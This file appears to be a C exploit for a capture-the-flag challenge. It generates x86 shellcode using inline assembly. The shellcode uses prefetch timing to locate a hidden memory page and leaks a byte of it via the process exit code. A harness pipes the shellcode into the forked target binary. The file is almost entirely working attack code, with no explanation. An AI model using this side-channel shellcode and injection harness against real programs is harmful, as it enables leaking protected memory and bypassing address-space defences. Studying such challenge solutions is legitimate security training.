#define LET_STDOUT 0
#define _GNU_SOURCE

#include <sys/mman.h>

#include <stdio.h>
#include <sched.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <semaphore.h>
#include <x86intrin.h>

#define PAGE_SIZE 0x1000
#define FLAGLEN  58
#define MEMSTART 0x13333370000 

#define MAKE_SHELLCODE(ptr) asm goto( \
        "lea rbx, [rip+%l1];"         \
        "mov %0, rbx;"                \
        "lea rax, [rip+%l2];"         \
        "sub rax, rbx;"               \
        "leave;"                      \
        "ret;"                        \
        :                             \
        : "m" (*ptr)                  \
        : "rax", "rbx"                \
        : SC, SC_END                  \
        )                             \


static inline __attribute__((always_inline)) size_t measure(void* ptr)
{
    size_t start, end;

    start = __rdtsc();
    _mm_lfence();
    __builtin_prefetch(ptr, 0, 1);
    _mm_lfence();

    end = __rdtsc();

    return end - start;
}


#define SYS_EXIT(val) do {asm volatile("mov rdi, " val "; mov rax, 0x3C; syscall;"); } while(0)

size_t shellcode(char** ptr)
{
    MAKE_SHELLCODE(ptr);

    register size_t min_time, time, idx, i;
SC:
//    asm volatile("mov rbp, 0x13333371000; mov rsp, 0x13333370900");

    min_time = -1;
    for (i = 0 ; i <= ~(-1ul << 24); i++)
    {
        time = measure((void*) (i << 0x10)); 
        if (min_time > time) {
            min_time = time;
            idx = (i << 0x10);
        }
    }

    asm volatile("xor rdi, rdi;"
                 "mov dil, [%0 + %1];"
                 "mov rax, 0x3c;"
                 "syscall" 
                 : 
                 : "r" (idx), "i" (0)
                 : "rdi", "rax");

SC_END:
    return 0;
}


int exec_challenge(char** argv, pid_t* pid);

int main(int argc, char** argv)
{
    char* ptr; 
    pid_t pid;
    int status;

    for (int i = 0; i < 1; i++)
    {
        size_t len = shellcode(&ptr);

        int fd = exec_challenge(argv, NULL);
        write(fd, ptr, len);

        wait(&status);
        int rc = WEXITSTATUS(status);
        if (WIFEXITED(status)) 
            fprintf(stderr, "Child terminated normally (RC: %d)\n", rc);
        else {
            fprintf(stderr, "(%d)Child terminated with error (RC: %d)\n",i, rc);
        }
    }
} 

int exec_challenge(char** argv, pid_t* pid)
{
    int pipes[2];
    pipe(pipes);

    pid_t pid_ret = fork();
    if (pid_ret < 0) {
        perror("fork");
        exit(1);
    }

    if (pid_ret) {
        close(pipes[0]);
        if (pid)
            *pid = pid_ret;
        return pipes[1];
    }

    close(pipes[1]);
    if (dup2(pipes[0], STDIN_FILENO) != STDIN_FILENO) {
        perror("dup2");
        exit(242);
    }
    if (!LET_STDOUT) {
        int fd = open("/dev/null", O_WRONLY);
        if (fd < 0) {
            perror("open /dev/null");
            exit(1);
        }
        if (dup2(fd, STDOUT_FILENO) != STDOUT_FILENO) {
            perror("dup2");
            exit(1);
        }
        close(fd);
    }

    close(pipes[0]);
    execvp(argv[1], &argv[1]);

    perror("execv");
    exit(243);
}
